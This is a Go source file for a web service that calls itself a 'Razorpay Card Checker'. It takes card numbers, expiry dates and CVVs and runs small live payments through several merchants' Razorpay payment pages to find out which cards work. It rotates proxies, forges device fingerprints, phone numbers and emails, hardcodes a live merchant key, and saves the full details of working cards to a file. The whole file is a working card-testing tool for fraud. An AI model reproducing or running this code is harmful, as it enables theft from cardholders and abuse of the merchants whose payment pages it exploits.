package main

import (
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// ============================================================
// CONSTANTS
// ============================================================
const (
	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
	BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
	PORT     = 10000 // ✅ Render ke liye 10000
)

// ✅ TUMHARI SITES - YAHAN UPDATE KARO
var razorpayURLs = []string{
	"https://pages.razorpay.com/pl_KjJwqXPzZv5R5k",
	"https://razorpay.me/@bharatkaaitech",
	"https://razorpay.me/@pathshalainc",
	"https://razorpay.me/@iiecm",
	"https://razorpay.me/@colorless",
	"https://razorpay.me/@ekalavyas",
	"https://razorpay.me/@specialtechno1119",
}

var (
	urlIndex   uint64
	proxyIndex uint64
)

// Fallback merchant data
var fallbackMerchant = map[string]string{
	"key_id":               "rzp_live_hrgl3RDoNMvCOs",
	"payment_link":         "pl_OzLkvRvf1drPps",
	"payment_page_item_id": "ppi_OzLkvSvf1drPpt",
	"keyless_header":       "api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==",
}

// Balance and CVV keywords
var balanceKeywords = []string{
	"insufficient account balance", "insufficient funds",
	"maximum transaction limit", "transaction limit exceeded",
	"low balance", "not enough balance", "insufficient balance",
	"exceeds your limit", "daily limit exceeded",
}

var cvvKeywords = []string{
	"cvv provided is incorrect", "incorrect_cvv",
	"invalid cvv", "wrong cvv", "cvv is incorrect",
}

var proxyErrorKeywords = []string{
	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
	"connection refused", "connection reset", "timeout",
	"no such host", "proxy connect",
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func genUA() string {
	major := randInt(120, 147)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	return "unknown"
}

func generateDeviceFingerprint() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, 128)
	for i := range result {
		result[i] = chars[randInt(0, len(chars)-1)]
	}
	return string(result)
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	rand.Read(buf)
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, _ := rand.Int(rand.Reader, big.NewInt(62))
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

func extractSessionToken(content string) string {
	if content == "" {
		return ""
	}

	token := findBetween(content, "window.session_token=\"", "\";")
	if token != "" && len(token) >= 40 {
		return token
	}

	patterns := []string{
		`session_token["']?\s*[:=]\s*["']([A-F0-9]{40,})["']`,
		`"session_token":"([A-F0-9]{40,})"`,
		`session_token=([A-F0-9]{40,})`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		match := re.FindStringSubmatch(content)
		if len(match) >= 2 && len(match[1]) >= 40 {
			return match[1]
		}
	}
	return ""
}

func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	for startIdx < len(content) {
		c := content[startIdx]
		if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			break
		}
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func maskCard(card string) string {
	if len(card) <= 8 {
		return card
	}
	return card[:6] + "******" + card[len(card)-4:]
}

func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
	}
	return "http://" + raw
}

func loadProxies(filepath string) []string {
	var proxies []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return proxies
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		formatted := formatProxy(line)
		if formatted != "" {
			proxies = append(proxies, formatted)
		}
	}
	return proxies
}

func getNextProxy(proxyList []string) string {
	if len(proxyList) == 0 {
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) - 1
	return proxyList[idx%uint64(len(proxyList))]
}

func getNextURL() string {
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	for _, k := range cvvKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	if strings.ToLower(errCode) == "incorrect_cvv" {
		return true
	}
	return false
}

// ============================================================
// HTTP CLIENT
// ============================================================

type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

func (r *FetchResponse) Text() string {
	return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
	var result map[string]interface{}
	err := json.Unmarshal([]byte(r.Body), &result)
	return result, err
}

type CustomFetch struct {
	client *http.Client
	ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  false,
		DisableKeepAlives:   false,
	}

	if proxyURL != "" {
		parsed, err := url.Parse(proxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy url: %w", err)
		}
		transport.Proxy = http.ProxyURL(parsed)
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   45 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}

	if ua == "" {
		ua = genUA()
	}

	return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/json"
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/x-www-form-urlencoded"
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	var reqBody io.Reader = body
	if reqBody == nil && method == "POST" {
		reqBody = strings.NewReader("")
	}

	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	if _, ok := headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", f.ua)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

// ============================================================
// CHECK RESULT
// ============================================================

type CheckResult struct {
	Status      string `json:"status"`
	Message     string `json:"response"`
	Proxy       string `json:"proxy"`
	ProxyStatus string `json:"proxy_status"`
}

// ============================================================
// CARD PARSING
// ============================================================

type ParsedCard struct {
	CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " ", ",", ":", "-", "_"}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					yy2 := yy
					if len(yy2) == 4 {
						yy2 = yy2[2:]
					}
					return &ParsedCard{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy2,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
	return nil, errors.New("invalid card format (use: CC|MM|YY|CVV)")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ============================================================
// MERCHANT EXTRACTION
// ============================================================

func extractMerchantData(siteURL, proxyURL string) (string, string, string, string, error) {
	ua := genUA()
	fetch, err := NewCustomFetch(proxyURL, ua)
	if err != nil {
		return "", "", "", "", err
	}
	defer fetch.client.CloseIdleConnections()

	r1, err := fetch.Get(siteURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
	})
	if err != nil {
		return "", "", "", "", err
	}

	jsonStr := extractJSONVar(r1.Text(), "data")
	if jsonStr == "" {
		return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
	}

	var initData map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
		return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
	}

	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if kyid == "" {
		return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
	}

	var plink, ppid string
	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}

	if plink == "" {
		return fallbackMerchant["key_id"], fallbackMerchant["payment_link"], fallbackMerchant["payment_page_item_id"], fallbackMerchant["keyless_header"], nil
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")
	if keylessHeader == "" {
		keylessHeader = fallbackMerchant["keyless_header"]
	}

	return kyid, plink, ppid, keylessHeader, nil
}

func getSessionToken(proxyURL string) (string, error) {
	ua := genUA()
	fetch, err := NewCustomFetch(proxyURL, ua)
	if err != nil {
		return "", err
	}
	defer fetch.client.CloseIdleConnections()

	rzpDeviceID, _ := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	params := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {fallbackMerchant["keyless_header"]},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get("https://api.razorpay.com/v1/checkout/public?"+params.Encode(), map[string]string{
		"Accept":  "text/html,application/xhtml+xml,*/*",
		"Referer": "https://pages.razorpay.com/",
	})
	if err != nil {
		return "", err
	}

	sessid := extractSessionToken(r3.Text())
	if sessid == "" {
		return "", errors.New("session token not found")
	}

	return sessid, nil
}

// ============================================================
// CARD CHECK WITH DATA
// ============================================================

func createOrder(fetch *CustomFetch, paymentLink, paymentItemID string, amountPaise int) (string, error) {
	payload := map[string]interface{}{
		"notes":      map[string]string{"comment": "", "name": "User"},
		"line_items": []map[string]interface{}{{"payment_page_item_id": paymentItemID, "amount": amountPaise}},
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", paymentLink),
		map[string]string{
			"Accept":       "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin":       "https://pages.razorpay.com",
			"Referer":      "https://pages.razorpay.com/",
		},
		payload,
	)
	if err != nil {
		return "", err
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return "", err
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		return "", errors.New("order creation failed")
	}

	return orderID, nil
}

func sendPreferences(fetch *CustomFetch, orderID, sessionToken, keylessHeader, rzpDeviceID, fhash string, orderAmount float64, orderCurrency, paymentLink, phone string) {
	resources := []string{
		"checkout_version_config", "merchant", "merchant_features", "downtime",
		"customer", "customer_tokens", "truecaller", "methods", "experiments",
		"offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization",
	}

	queryArr := make([]map[string]string, len(resources))
	for i, r := range resources {
		queryArr[i] = map[string]string{"resource": r}
	}

	payload := map[string]interface{}{
		"query": queryArr,
		"query_params": map[string]interface{}{
			"device_id":       rzpDeviceID,
			"rtb_device_id":   fhash,
			"amount":          orderAmount,
			"currency":        orderCurrency,
			"option_currency": orderCurrency,
			"truecaller":      false,
			"qr_required":     false,
			"library":         "checkoutjs",
			"platform":        "browser",
			"order_id":        orderID,
			"payment_link_id": paymentLink,
			"contact":         phone,
		},
		"action": "get",
	}

	headers := map[string]string{
		"Accept":          "*/*",
		"Origin":          "https://api.razorpay.com",
		"Referer":         fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?session_token=%s", sessionToken),
		"x-session-token": sessionToken,
		"Content-Type":    "application/json",
	}

	fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessionToken, keylessHeader),
		headers, payload,
	)
}

func sendCheckoutOrder(fetch *CustomFetch, orderID, sessionToken, keylessHeader, keyID, email, phoneShort, phone, orderCurrency, rzpDeviceID, fhash string, orderAmount float64, paymentLink, checkoutID string) {
	formData := url.Values{
		"notes[email]":          {email},
		"notes[phone]":          {phoneShort},
		"payment_link_id":       {paymentLink},
		"key_id":                {keyID},
		"contact":               {phone},
		"email":                 {email},
		"currency":              {orderCurrency},
		"_[integration]":        {"payment_pages"},
		"_[device.id]":          {rzpDeviceID},
		"_[library]":            {"checkoutjs"},
		"_[library_src]":        {"no-src"},
		"_[current_script_src]": {"no-src"},
		"_[platform]":           {"browser"},
		"_[env]":                {""},
		"_[is_magic_script]":    {"false"},
		"_[os]":                 {"windows"},
		"_[shield][fhash]":      {fhash},
		"_[shield][tz]":         {"0"},
		"_[device_id]":          {rzpDeviceID},
		"_[build]":              {BUILD},
		"_[shield][os]":         {"windows"},
		"_[shield][platform]":   {"browser"},
		"_[shield][browser]":    {"chrome"},
		"_[request_index]":      {"0"},
		"amount":                {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":              {orderID},
		"method":                {"card"},
		"checkout_id":           {checkoutID},
	}

	headers := map[string]string{
		"Accept":          "*/*",
		"Origin":          "https://api.razorpay.com",
		"x-session-token": sessionToken,
		"Content-Type":    "application/x-www-form-urlencoded",
	}

	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", keyID, sessionToken, keylessHeader),
		headers, formData,
	)
}

func sendCrossBorder(fetch *CustomFetch, orderID, keylessHeader string, orderAmount float64, orderCurrency, brand string) {
	payload := map[string]interface{}{
		"identifiers": map[string]interface{}{
			"merchant":         map[string]string{"country": "IN"},
			"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
			"method":           "card",
			"payment_currency": orderCurrency,
		},
		"forex_charges": map[string]interface{}{
			"amount":   orderAmount,
			"currency": orderCurrency,
			"filters":  map[string]string{"method": "card"},
		},
	}

	headers := map[string]string{
		"Accept":       "*/*",
		"Origin":       "https://api.razorpay.com",
		"Content-Type": "application/json",
	}

	fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, url.QueryEscape(keylessHeader)),
		headers, payload,
	)
}

func submitPayment(fetch *CustomFetch, orderID, cc, mm, yy, cvv string, amountPaise int, keyID, keylessHeader, paymentLink, sessionToken, siteURL, rzpDeviceID, fhash, checkoutID string, orderAmount float64, orderCurrency, brand string) (*FetchResponse, error) {
	year, _ := strconv.Atoi(yy)
	if year < 100 {
		year = 2000 + year
	}

	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()
	deviceFingerprint := generateDeviceFingerprint()

	tokenData := fmt.Sprintf(`[{"name":"sardine","metadata":{"session_id":"%s"}}]`, checkoutID)
	userRiskToken := base64.StdEncoding.EncodeToString([]byte(tokenData))

	formData := url.Values{
		"user_risk_providers_token": {userRiskToken},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {"User"},
		"payment_link_id":           {paymentLink},
		"key_id":                    {keyID},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {siteURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {"User"},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
		"device_fingerprint[fingerprint_payload]": {deviceFingerprint},
	}

	headers := map[string]string{
		"Accept":          "*/*",
		"Origin":          "https://api.razorpay.com",
		"x-session-token": sessionToken,
	}

	return fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessionToken, keylessHeader),
		headers, formData,
	)
}

func checkCardWithData(cc, mm, yy, cvv, proxyURL, targetURL, kyid, plink, ppid, keylessHeader, sessid string, amountPaise int) CheckResult {
	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()

	rzpDeviceID, fhash := generateRzpDeviceID()

	fetch, err := NewCustomFetch(proxyURL, ua)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

	// Create order
	orderID, err := createOrder(fetch, plink, ppid, amountPaise)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}
	orderAmount := float64(amountPaise)
	orderCurrency := "INR"

	// Send preferences
	sendPreferences(fetch, orderID, sessid, keylessHeader, rzpDeviceID, fhash, orderAmount, orderCurrency, plink, phone)

	// Send checkout order
	sendCheckoutOrder(fetch, orderID, sessid, keylessHeader, kyid, email, phoneShort, phone, orderCurrency, rzpDeviceID, fhash, orderAmount, plink, checkoutID)

	// Send cross border flows
	sendCrossBorder(fetch, orderID, keylessHeader, orderAmount, orderCurrency, brand)

	time.Sleep(time.Duration(randInt(1000, 2000)) * time.Millisecond)

	// Submit payment
	r7, err := submitPayment(fetch, orderID, cc, mm, yy2, cvv, amountPaise, kyid, keylessHeader, plink, sessid, targetURL, rzpDeviceID, fhash, checkoutID, orderAmount, orderCurrency, brand)
	if err != nil {
		return makeProxyError(err, proxyURL)
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		return CheckResult{Status: "error", Message: "Payment response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}

		if isBalanceKeyword(strings.ToLower(errDesc)) || isCVVKeyword(strings.ToLower(errDesc), errCode) {
			return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
		}
		return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	// Handle redirect
	if redirect, ok := r7Data["redirect"].(bool); ok && redirect {
		time.Sleep(3 * time.Second)
		return CheckResult{Status: "live", Message: "3DS/OTP Required", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	// Check signature
	if _, ok := r7Data["razorpay_signature"]; ok {
		return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	return CheckResult{Status: "declined", Message: "Payment failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
}

func makeProxyError(err error, proxyURL string) CheckResult {
	msg := truncate(err.Error(), 120)
	return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: "DEAD"}
}

// ============================================================
// ROOT HANDLER - API INFO
// ============================================================

func rootHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":   "active",
		"message":  "Razorpay API Checker is running",
		"endpoint": "/razorpay/cc=CC|MM|YY|CVV",
		"example":  "/razorpay/cc=4111111111111111|12|26|123",
		"sites":    len(razorpayURLs),
	})
}

// ============================================================
// LEGACY HANDLER
// ============================================================

func handler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	path := r.URL.Path
	re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
	match := re.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid endpoint. Use: /razorpay/cc=CC|MM|YY|CVV",
			"proxy":    "N/A",
		})
		return
	}

	cardData, _ := url.QueryUnescape(match[1])
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": err.Error(),
			"proxy":    "N/A",
		})
		return
	}

	proxyList := loadProxies("px.txt")
	proxy := getNextProxy(proxyList)
	targetURL := getNextURL()

	log.Printf("Checking card: %s on site: %s", maskCard(card.CC), targetURL)

	kyid, plink, ppid, keylessHeader, err := extractMerchantData(targetURL, proxy)
	if err != nil {
		log.Printf("Merchant extraction error: %v", err)
	}

	sessid, err := getSessionToken(proxy)
	if err != nil {
		log.Printf("Session token error: %v", err)
	}

	result := checkCardWithData(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL, kyid, plink, ppid, keylessHeader, sessid, 100)

	proxyDisplay := result.Proxy
	if proxyDisplay == "" {
		proxyDisplay = "DIRECT"
	}
	proxyDisplay = proxyDisplay + " [" + result.ProxyStatus + "]"
	
	logLive(card, result)
	logResult(card, result, proxyDisplay, targetURL)

	resp := map[string]string{
		"status":   result.Status,
		"response": result.Message,
		"proxy":    proxyDisplay,
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	json.NewEncoder(w).Encode(resp)
}

func logLive(card *ParsedCard, result CheckResult) {
	if result.Status == "charged" || result.Status == "approved" {
		line := fmt.Sprintf("%s|%s|%s|%s - %s - %s\n", card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
		f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString(line)
			f.Close()
		}
	}
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
	first6 := card.CC
	if len(first6) > 6 {
		first6 = first6[:6]
	}
	last4 := card.CC
	if len(last4) > 4 {
		last4 = last4[len(last4)-4:]
	}
	middle := strings.Repeat("*", len(card.CC)-10)
	if len(middle) < 6 {
		middle = "******"
	}
	log.Printf("[%s] %s%s%s | %s | %s | Site: %s", strings.ToUpper(result.Status), first6, middle, last4, result.Message, proxyDisplay, targetURL)
}

// ============================================================
// MAIN
// ============================================================

func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/razorpay/cc=", handler)

	addr := fmt.Sprintf("0.0.0.0:%d", PORT)
	log.Printf("=========================================================")
	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  Endpoint: /razorpay/cc=CC|MM|YY|CVV")
	log.Printf("  Example: /razorpay/cc=4111111111111111|12|26|123")
	log.Printf("  Total Sites: %d", len(razorpayURLs))
	log.Printf("=========================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}